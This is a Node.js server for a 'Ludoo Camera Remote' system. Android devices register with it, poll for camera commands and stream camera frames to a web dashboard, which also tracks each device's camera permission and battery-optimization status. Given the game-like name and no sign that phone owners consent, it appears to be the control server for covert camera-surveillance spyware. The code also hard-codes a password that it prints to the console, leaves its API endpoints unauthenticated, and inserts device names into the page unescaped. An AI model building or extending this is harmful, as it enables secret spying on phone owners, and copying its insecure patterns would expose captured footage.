const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*', methods: ['GET', 'POST'] },
    transports: ['websocket', 'polling']
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ========== AUTH ==========
const DASHBOARD_PASSWORD = 'ajaybabu95';

// ========== STATE ==========
let devices = [];
let deviceHeartbeats = {};
let pendingCommands = {};
let latestFrames = {};
let deviceSettings = {};
let activeStreams = {};

function getDeviceSettings(deviceId) {
    if (!deviceSettings[deviceId]) {
        deviceSettings[deviceId] = { stream: false, quality: 240, fps: 15, camera: 'back' };
    }
    return deviceSettings[deviceId];
}

function findCanonicalDevice(deviceId) {
    if (!deviceId) return null;
    const exact = devices.find(d => d.id === deviceId);
    if (exact) return exact;
    let best = null, bestLen = 0;
    for (const d of devices) {
        let common = 0;
        while (common < d.id.length && common < deviceId.length && d.id[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, d.id.length, deviceId.length)) {
            best = d; bestLen = common;
        }
    }
    return best;
}

function resolveLatestFrame(deviceId) {
    if (latestFrames[deviceId]) return latestFrames[deviceId];
    let bestFrame = null, bestLen = 0;
    for (const knownId of Object.keys(latestFrames)) {
        let common = 0;
        while (common < knownId.length && common < deviceId.length && knownId[common] === deviceId[common]) common++;
        if (common > bestLen && common >= Math.min(8, knownId.length, deviceId.length)) {
            bestFrame = latestFrames[knownId]; bestLen = common;
        }
    }
    return bestFrame || null;
}

// Cleanup stale devices every 10s
setInterval(() => {
    const now = Date.now();
    devices = devices.filter(device => {
        const stale = (now - (device.lastSeen || 0)) > 20000;
        if (stale) {
            console.log(`🗑️ Removing stale device: ${device.id}`);
            delete deviceHeartbeats[device.id];
            delete pendingCommands[device.id];
            delete latestFrames[device.id];
            delete deviceSettings[device.id];
            delete activeStreams[device.id];
            return false;
        }
        return true;
    });
}, 10000);

// ========== HTTP API ==========

// REGISTER DEVICE
app.post('/api/register', (req, res) => {
    try {
        const { deviceId, deviceName } = req.body;
        console.log(`📱 Device registered: ${deviceId} (${deviceName})`);
        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = {
                id: deviceId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now(),
                lastSeen: Date.now()
            };
            devices.push(device);
        } else {
            device.lastSeen = Date.now();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// HEARTBEAT
app.post('/api/heartbeat', (req, res) => {
    try {
        const {
            deviceId, deviceName, camera, cameraReady, streaming,
            cameraPermission, batteryOptimization, batteryPercentage
        } = req.body;

        deviceHeartbeats[deviceId] = Date.now();
        let device = devices.find(d => d.id === deviceId);
        if (!device) {
            device = {
                id: deviceId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now()
            };
            devices.push(device);
        }
        device.name = deviceName || device.name;
        device.camera = camera || device.camera;
        device.cameraReady = cameraReady || false;
        device.streaming = streaming || false;
        device.cameraPermission = cameraPermission || false;
        device.batteryOptimization = batteryOptimization || false;
        device.batteryPercentage = batteryPercentage || 0;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();
        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// FRAME UPLOAD
app.post('/api/frame', (req, res) => {
    try {
        const { deviceId, image, quality, fps, camera } = req.body;
        if (deviceId && image) {
            const ds = getDeviceSettings(deviceId);
            const frameData = {
                image,
                ts: Date.now(),
                quality: quality || ds.quality || 240,
                fps: fps || ds.fps || 15,
                camera: camera || ds.camera || 'back'
            };
            latestFrames[deviceId] = frameData;
            
            if (activeStreams[deviceId]) {
                io.to(activeStreams[deviceId]).emit('frame', {
                    deviceId,
                    image,
                    timestamp: frameData.ts
                });
            }
            
            const dev = devices.find(d => d.id === deviceId);
            if (dev) dev.lastSeen = Date.now();
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// FRAME FETCH
app.get('/api/frame/:deviceId', (req, res) => {
    const frame = resolveLatestFrame(req.params.deviceId);
    if (!frame) return res.json({ success: false, image: null });
    res.json({ success: true, image: frame.image, ts: frame.ts });
});

// COMMAND SEND - HTTP Only (Polling)
app.post('/api/command', (req, res) => {
    try {
        const { deviceId, command, value } = req.body;
        console.log(`📨 HTTP Command: [${command}] for [${deviceId}]`);

        const ds = getDeviceSettings(deviceId);
        switch (command) {
            case 'start':
                ds.stream = true;
                break;
            case 'stop':
                ds.stream = false;
                break;
            case 'flip':
                ds.camera = ds.camera === 'back' ? 'front' : 'back';
                break;
            case 'quality':
                ds.quality = value || 240;
                break;
            case 'fps':
                ds.fps = value || 15;
                break;
            default:
                console.log(`⚠️ Unknown command: ${command}`);
        }

        const cmd = { command, value: value ?? null };

        if (deviceId) {
            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
            pendingCommands[deviceId].push(cmd);
            console.log(`📦 Command queued for HTTP poll: ${command}`);
        }

        res.json({ success: true, settings: getDeviceSettings(deviceId) });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// COMMAND POLL - Android HTTP Polling
app.get('/api/commands/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        deviceHeartbeats[deviceId] = Date.now();

        const existingDevice = findCanonicalDevice(deviceId);
        if (!existingDevice) {
            devices.push({
                id: deviceId,
                name: deviceId,
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now(),
                lastSeen: Date.now()
            });
        } else {
            existingDevice.lastSeen = Date.now();
        }

        let cmds = [];
        if (pendingCommands[deviceId] && pendingCommands[deviceId].length > 0) {
            cmds = pendingCommands[deviceId].map(c => c.command);
            pendingCommands[deviceId] = [];
        }

        if (cmds.length > 0) {
            console.log(`✅ HTTP Poll delivered ${cmds.length} commands to ${deviceId}`);
        }

        res.json({
            success: true,
            settings: getDeviceSettings(deviceId),
            commands: cmds
        });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// DEVICES LIST
app.get('/api/devices', (req, res) => {
    const now = Date.now();
    res.json({
        success: true,
        devices: devices.map(d => ({
            id: d.id,
            name: d.name,
            camera: d.camera || 'back',
            cameraReady: d.cameraReady || false,
            streaming: d.streaming || false,
            cameraPermission: d.cameraPermission || false,
            batteryOptimization: d.batteryOptimization || false,
            batteryPercentage: d.batteryPercentage || 0,
            isConnected: (now - (d.lastSeen || 0)) < 20000,
            hasWebSocket: !!activeStreams[d.id],
            lastHeartbeat: d.lastHeartbeat,
            connectedAt: d.connectedAt,
            settings: getDeviceSettings(d.id)
        }))
    });
});

// DEVICE DETAIL - For Status Panel
app.get('/api/device/:deviceId', (req, res) => {
    const device = devices.find(d => d.id === req.params.deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Not found' });
    const now = Date.now();
    res.json({
        success: true,
        device: {
            ...device,
            isConnected: (now - (device.lastSeen || 0)) < 20000,
            hasWebSocket: !!activeStreams[device.id],
            settings: getDeviceSettings(device.id)
        }
    });
});

// HEALTH
app.get('/api/health', (req, res) => res.json({
    status: 'ok',
    devices: devices.length,
    uptime: process.uptime(),
    frames: Object.keys(latestFrames).length,
    commands: Object.keys(pendingCommands).reduce((acc, key) => acc + pendingCommands[key].length, 0)
}));

// DEBUG
app.get('/api/debug', (req, res) => {
    res.json({
        devices: devices.map(d => d.id),
        activeStreams,
        pendingCommands,
        heartbeats: Object.fromEntries(
            Object.entries(deviceHeartbeats).map(([k, v]) => [k, `${Math.round((Date.now() - v) / 1000)}s ago`])
        )
    });
});

app.get('/favicon.ico', (req, res) => res.status(204).end());

// ========== WEBSOCKET ==========

io.on('connection', (socket) => {
    console.log(`🔌 WS connected: ${socket.id}`);

    socket.on('register_stream', (data) => {
        const { deviceId, deviceName, cameraReady, cameraPermission, batteryOptimization } = data;

        const canonical = findCanonicalDevice(deviceId);
        const canonicalId = canonical ? canonical.id : deviceId;

        let device = devices.find(d => d.id === canonicalId);
        if (!device) {
            device = {
                id: canonicalId,
                name: deviceName || 'Android Device',
                connectedAt: new Date().toLocaleTimeString(),
                firstSeen: Date.now()
            };
            devices.push(device);
        }
        if (deviceName) device.name = deviceName;
        if (cameraReady !== undefined) device.cameraReady = cameraReady;
        if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
        device.lastHeartbeat = new Date().toLocaleTimeString();
        device.lastSeen = Date.now();

        socket.deviceId = canonicalId;
        socket.join('streamers');

        console.log(`📡 Device [${canonicalId}] registered for WebSocket stream`);
        socket.emit('settings', getDeviceSettings(canonicalId));
    });

    socket.on('device_status_update', (data) => {
        const canonicalId = socket.deviceId;
        if (!canonicalId) return;
        const device = devices.find(d => d.id === canonicalId);
        if (!device) return;

        const { cameraReady, cameraPermission, batteryOptimization, batteryPercentage, streaming } = data;
        if (cameraReady !== undefined) device.cameraReady = cameraReady;
        if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
        if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
        if (batteryPercentage !== undefined) device.batteryPercentage = batteryPercentage;
        if (streaming !== undefined) device.streaming = streaming;
        device.lastSeen = Date.now();

        console.log(`🔄 Status update [${canonicalId}]: cam=${cameraPermission} batt=${batteryOptimization}`);
    });

    socket.on('stream_frame', (data) => {
        const { deviceId, image, timestamp, quality, fps, camera } = data;
        const canonicalId = socket.deviceId || deviceId;

        const dev = devices.find(d => d.id === canonicalId);
        if (dev) dev.lastSeen = Date.now();

        if (canonicalId && image) {
            const ds = getDeviceSettings(canonicalId);
            const frameData = {
                image,
                ts: timestamp || Date.now(),
                quality: quality || ds.quality || 240,
                fps: fps || ds.fps || 15,
                camera: camera || ds.camera || 'back'
            };
            latestFrames[canonicalId] = frameData;

            activeStreams[canonicalId] = socket.id;

            socket.broadcast.emit('frame', {
                deviceId: canonicalId,
                image,
                timestamp: frameData.ts
            });
        }
    });

    socket.on('subscribe_stream', (data) => {
        const { deviceId } = data;
        if (deviceId) {
            socket.join(`stream_${deviceId}`);
            console.log(`📺 Dashboard subscribed to ${deviceId}`);
            
            const frame = resolveLatestFrame(deviceId);
            if (frame) {
                socket.emit('frame', {
                    deviceId,
                    image: frame.image,
                    timestamp: frame.ts
                });
            }
        }
    });

    socket.on('disconnect', () => {
        if (socket.deviceId) {
            const disconnectedId = socket.deviceId;
            setTimeout(() => {
                if (activeStreams[disconnectedId] === socket.id) {
                    delete activeStreams[disconnectedId];
                    console.log(`📴 Device [${disconnectedId}] WS stream ended`);
                }
            }, 8000);
            console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 8s`);
        } else {
            console.log(`🔌 WS client disconnected: ${socket.id}`);
        }
    });
});

// ========== LOGIN API ==========
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === DASHBOARD_PASSWORD) {
        return res.json({ success: true });
    }
    res.status(401).json({ success: false, error: 'Wrong password' });
});

// ========== DASHBOARD ==========
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ludoo Camera Remote</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
        .container { max-width:600px; margin:0 auto; }
        .header { text-align:center; margin-bottom:20px; }
        .header h1 { font-size:24px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .header p { font-size:12px; color:#666; margin-top:5px; }
        .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:20px; }
        .stat-card { background:#1a1a1a; border-radius:12px; padding:12px; text-align:center; border:1px solid #2a2a2a; }
        .stat-label { font-size:11px; color:#888; margin-bottom:5px; }
        .stat-value { font-size:20px; font-weight:700; }
        .stat-value.online { color:#4CAF50; }
        .video-container { background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; margin-bottom:20px; border:1px solid #2a2a2a; display:flex; align-items:center; justify-content:center; position:relative; }
        #video { width:100%; height:100%; object-fit:cover; display:none; }
        .video-placeholder { text-align:center; color:#555; }
        .video-placeholder span { font-size:48px; }
        #streamStatus { position:absolute; top:10px; left:10px; font-size:10px; padding:4px 12px; border-radius:20px; font-weight:600; display:none; }
        .stream-live { background:rgba(76,175,80,.9); color:#fff; display:block !important; }
        .stream-waiting { background:rgba(255,152,0,.9); color:#fff; display:block !important; }
        .stream-noframes{ background:rgba(244,67,54,.9); color:#fff; display:block !important; }
        .controls { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
        .section-title { font-size:12px; color:#888; margin-bottom:12px; letter-spacing:1px; }
        .button-group { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
        .btn { padding:12px 20px; border:none; border-radius:12px; font-size:14px; font-weight:600; cursor:pointer; transition:all .2s; }
        .btn-start { background:#4CAF50; color:white; } .btn-start:hover { background:#45a049; }
        .btn-stop { background:#f44336; color:white; } .btn-stop:hover { background:#da190b; }
        .btn-flip { background:#2196F3; color:white; } .btn-flip:hover { background:#0b7dda; }
        .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
        .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
        .quality-btn.active { background:#667eea; border-color:#667eea; }
        .fps-control { margin-top:16px; }
        .fps-slider { width:100%; height:4px; -webkit-appearance:none; background:#2a2a2a; border-radius:2px; margin:10px 0; }
        .fps-slider::-webkit-slider-thumb { -webkit-appearance:none; width:16px; height:16px; background:#667eea; border-radius:50%; cursor:pointer; }
        .fps-value { text-align:center; font-size:12px; color:#888; }
        .devices { background:#1a1a1a; border-radius:16px; padding:16px; border:1px solid #2a2a2a; }
        .device-item { display:flex; justify-content:space-between; align-items:center; padding:12px 10px; cursor:pointer; transition:background .2s; border-radius:8px; margin:2px 0; }
        .device-item:hover { background:#252525; }
        .device-item.selected { background:#1e1e3a; border:1px solid #667eea; }
        .device-name { font-size:14px; font-weight:500; }
        .device-status-dot { width:10px; height:10px; border-radius:50%; margin-left:10px; }
        .status-connected { background:#4CAF50; box-shadow:0 0 5px #4CAF50; }
        .empty-devices { text-align:center; color:#555; padding:20px; }
        .logout-btn { background:rgba(255,255,255,0.08); border:1px solid #333; color:#888; padding:6px 14px; border-radius:20px; font-size:12px; cursor:pointer; text-decoration:none; transition:all .2s; border:none; }
        .logout-btn:hover { background:rgba(244,67,54,0.2); border-color:#f44336; color:#ff6b6b; }
        .header { position:relative; }
        /* Status Panel */
        .status-panel { background:#1a1a1a; border-radius:12px; padding:16px; border:1px solid #2a2a2a; margin-top:16px; display:none; }
        .status-panel.show { display:block; }
        .status-panel-title { font-size:14px; font-weight:600; margin-bottom:12px; color:#667eea; }
        .status-row { display:flex; justify-content:space-between; align-items:center; padding:6px 0; border-bottom:1px solid #222; font-size:13px; }
        .status-row:last-child { border-bottom:none; }
        .status-label { color:#888; }
        .status-value.allowed { color:#4CAF50; font-weight:600; }
        .status-value.denied { color:#f44336; font-weight:600; }
        .status-value.unknown { color:#ff9800; font-weight:600; }
        .battery-bar { height:8px; background:#2a2a2a; border-radius:4px; overflow:hidden; width:100px; }
        .battery-fill { height:100%; border-radius:4px; background:linear-gradient(90deg,#4CAF50,#8BC34A); }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📹 Ludoo Remote</h1>
        <p id="connMode">HTTP Polling Mode</p>
        <a href="/logout" class="logout-btn">🔒 Logout</a>
    </div>
    <div class="stats">
        <div class="stat-card"><div class="stat-label">STATUS</div><div class="stat-value online" id="serverStatus">● Online</div></div>
        <div class="stat-card"><div class="stat-label">DEVICES</div><div class="stat-value" id="deviceCount">0</div></div>
        <div class="stat-card"><div class="stat-label">FPS</div><div class="stat-value" id="fpsCount">0</div></div>
    </div>
    <div class="video-container" id="videoContainer">
        <img id="video"><div id="placeholder" class="video-placeholder"><span>📷</span><br>No frames</div>
        <div id="streamStatus" class="stream-waiting">⏳ Waiting...</div>
    </div>
    <div class="controls">
        <div class="section-title">🎮 CONTROLS</div>
        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-flip" id="flipBtn">🔄 FLIP</button></div>
        <div class="section-title">📐 QUALITY</div>
        <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
        <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
    </div>
    <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
    <!-- Device Status Panel -->
    <div class="status-panel" id="statusPanel">
        <div class="status-panel-title">📋 Device Status</div>
        <div id="statusPanelContent">
            <div class="status-row"><span class="status-label">Device Name</span><span id="sDeviceName">-</span></div>
            <div class="status-row"><span class="status-label">Status</span><span id="sStatus">-</span></div>
            <div class="status-row"><span class="status-label">Camera Permission</span><span id="sCameraPerm">-</span></div>
            <div class="status-row"><span class="status-label">Battery Optimization</span><span id="sBatteryOpt">-</span></div>
            <div class="status-row"><span class="status-label">Battery Level</span><span id="sBatteryLevel">-</span></div>
            <div class="status-row"><span class="status-label">Camera Ready</span><span id="sCameraReady">-</span></div>
            <div class="status-row"><span class="status-label">Streaming</span><span id="sStreaming">-</span></div>
            <div class="status-row"><span class="status-label">Camera Type</span><span id="sCameraType">-</span></div>
            <div class="status-row"><span class="status-label">Last Heartbeat</span><span id="sLastHeartbeat">-</span></div>
            <div class="status-row"><span class="status-label">WebSocket</span><span id="sWebSocket">-</span></div>
        </div>
    </div>
</div>
<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io({ transports: ['websocket', 'polling'] });
    let selectedDeviceId = null, currentDevices = [], isStreaming = false;
    let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;

    socket.on('connect', () => {
        document.getElementById('connMode').textContent = '⚡ WebSocket connected';
    });
    socket.on('disconnect', () => {
        document.getElementById('connMode').textContent = '⚠ WebSocket disconnected — using HTTP';
    });

    socket.on('device_update', (data) => {
        const idx = currentDevices.findIndex(d => d.id === data.id);
        if (idx !== -1) {
            currentDevices[idx] = { ...currentDevices[idx], ...data };
        } else {
            currentDevices.push(data);
        }
        renderDeviceList();
        // Update status panel if this device is selected
        if (selectedDeviceId === data.id) {
            updateStatusPanel(data);
        }
    });

    socket.on('frame', (data) => {
        if (!isStreaming || !data.image) return;
        const idMatch = data.deviceId === selectedDeviceId;
        const singleDevice = currentDevices.filter(d => d.isConnected).length <= 1;
        if (!idMatch && !singleDevice) return;
        if ((data.timestamp || 0) <= lastFrameTs) return;
        lastFrameTs = data.timestamp || Date.now();
        updateFrame('data:image/jpeg;base64,' + data.image);
    });

    const video = document.getElementById('video'),
          placeholder = document.getElementById('placeholder'),
          deviceCountSpan = document.getElementById('deviceCount'),
          fpsCountSpan = document.getElementById('fpsCount'),
          devicesList = document.getElementById('devicesList'),
          fpsSlider = document.getElementById('fpsSlider'),
          fpsLabel = document.getElementById('fpsLabel');

    function updateStatusPanel(device) {
        const getStatus = (val) => {
            if (val === true) return '<span class="status-value allowed">✅ Allowed</span>';
            if (val === false) return '<span class="status-value denied">❌ Denied</span>';
            return '<span class="status-value unknown">⏳ Unknown</span>';
        };
        const getYesNo = (val) => {
            if (val === true) return '<span class="status-value allowed">Yes</span>';
            if (val === false) return '<span class="status-value denied">No</span>';
            return '<span class="status-value unknown">Unknown</span>';
        };
        document.getElementById('sDeviceName').textContent = device.name || device.id;
        document.getElementById('sStatus').innerHTML = device.isConnected ? '<span class="status-value allowed">● Online</span>' : '<span class="status-value denied">● Offline</span>';
        document.getElementById('sCameraPerm').innerHTML = getStatus(device.cameraPermission);
        document.getElementById('sBatteryOpt').innerHTML = getStatus(device.batteryOptimization);
        const battery = device.batteryPercentage || 0;
        document.getElementById('sBatteryLevel').innerHTML = \`\${battery}% <div class="battery-bar"><div class="battery-fill" style="width:\${battery}%"></div></div>\`;
        document.getElementById('sCameraReady').innerHTML = getYesNo(device.cameraReady);
        document.getElementById('sStreaming').innerHTML = device.streaming ? '<span class="status-value allowed">▶ Active</span>' : '<span class="status-value denied">⏹ Stopped</span>';
        document.getElementById('sCameraType').textContent = device.camera || 'back';
        document.getElementById('sLastHeartbeat').textContent = device.lastHeartbeat || 'N/A';
        document.getElementById('sWebSocket').innerHTML = device.hasWebSocket ? '<span class="status-value allowed">✅ Connected</span>' : '<span class="status-value denied">❌ Disconnected</span>';
        document.getElementById('statusPanel').classList.add('show');
    }

    function updateFrame(src) {
        video.src = src;
        video.style.display = 'block';
        placeholder.style.display = 'none';
        document.getElementById('streamStatus').className = 'stream-live';
        document.getElementById('streamStatus').textContent = '🔴 Live';
        frameCount++;
        const now = Date.now();
        if (now - lastFpsUpdate >= 1000) {
            fpsCountSpan.textContent = frameCount;
            frameCount = 0;
            lastFpsUpdate = now;
        }
    }

    function startFramePoll() {
        stopFramePoll();
        const fps = parseInt(fpsSlider.value) || 15;
        const interval = Math.max(50, Math.round(1000 / fps));
        framePollTimer = setInterval(() => {
            if (!selectedDeviceId || !isStreaming) return;
            fetch('/api/frame/' + selectedDeviceId)
                .then(r => r.json())
                .then(data => {
                    if (data.success && data.image && data.ts > lastFrameTs) {
                        lastFrameTs = data.ts;
                        updateFrame('data:image/jpeg;base64,' + data.image);
                    }
                }).catch(() => {});
        }, interval);
    }
    function stopFramePoll() { if (framePollTimer) { clearInterval(framePollTimer); framePollTimer = null; } }

    function sendCommand(command, value) {
        if (!selectedDeviceId) { alert('Select a device first'); return; }
        fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
        }).catch(() => {});
    }

    document.getElementById('startBtn').onclick = () => {
        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
        sendCommand('start');
        isStreaming = true;
        document.getElementById('streamStatus').className = 'stream-waiting';
        document.getElementById('streamStatus').textContent = '⏳ Starting...';
        startFramePoll();
    };
    document.getElementById('stopBtn').onclick = () => {
        if (!selectedDeviceId) return;
        sendCommand('stop');
        isStreaming = false;
        stopFramePoll();
        video.src = ''; video.style.display = 'none';
        placeholder.style.display = 'block';
        document.getElementById('streamStatus').className = 'stream-waiting';
        document.getElementById('streamStatus').textContent = '⏳ Stopped';
        fpsCountSpan.textContent = '0';
    };
    document.getElementById('flipBtn').onclick = () => sendCommand('flip');

    document.querySelectorAll('.quality-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            sendCommand('quality', parseInt(btn.dataset.quality));
        };
    });
    fpsSlider.oninput = () => {
        const fps = parseInt(fpsSlider.value);
        fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : '');
        sendCommand('fps', fps);
        if (isStreaming) startFramePoll();
    };

    function selectDevice(deviceId) {
        selectedDeviceId = deviceId;
        if (isStreaming) { sendCommand('stop'); stopFramePoll(); }
        isStreaming = false;
        video.src = ''; video.style.display = 'none';
        placeholder.textContent = '▶ Press START to stream'; placeholder.style.display = 'block';
        document.getElementById('streamStatus').className = 'stream-waiting';
        document.getElementById('streamStatus').textContent = '⏳ Waiting...';
        fpsCountSpan.textContent = '0';
        // Update status panel
        const device = currentDevices.find(d => d.id === deviceId);
        if (device) {
            updateStatusPanel(device);
        }
        renderDeviceList();
    }

    function renderDeviceList() {
        const connected = currentDevices.filter(d => d.isConnected);
        deviceCountSpan.textContent = connected.length;
        if (connected.length === 0) { devicesList.innerHTML = '<div class="empty-devices">No devices connected</div>'; return; }
        devicesList.innerHTML = connected.map(d =>
            '<div class="device-item' + (d.id === selectedDeviceId ? ' selected' : '') + '" data-id="' + d.id + '" onclick="selectDevice(\'' + d.id + '\')">' +
            '<span class="device-name">📱 ' + d.name + (d.hasWebSocket ? ' ⚡WS' : '') + '</span>' +
            (d.streaming ? '<span style="color:#4CAF50;font-size:10px;">● LIVE</span>' : '') +
            '<div class="device-status-dot status-connected"></div>' +
            '</div>'
        ).join('');
    }

    async function fetchDevices() {
        try {
            const data = await fetch('/api/devices').then(r => r.json());
            if (data.success) {
                currentDevices = data.devices;
                if (!selectedDeviceId && currentDevices.filter(d => d.isConnected).length > 0) {
                    selectDevice(currentDevices.filter(d => d.isConnected)[0].id);
                    return;
                }
                renderDeviceList();
            }
        } catch(e) {}
    }

    fetchDevices();
    setInterval(fetchDevices, 3000);
</script>
</body>
</html>`);
});

// ========== START ==========
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('═══════════════════════════════════════════════════');
    console.log('✅  Ludoo Camera Remote  —  Server Ready');
    console.log('═══════════════════════════════════════════════════');
    console.log(`🌐  Web UI       : http://localhost:${PORT}`);
    console.log(`🔑  Password     : ${DASHBOARD_PASSWORD}`);
    console.log('📡  Commands     : HTTP Polling Only');
    console.log('⚡  WebSocket    : Stream Only');
    console.log('📱  Commands     : start, stop, flip, quality, fps');
    console.log('═══════════════════════════════════════════════════');
    console.log('');
});
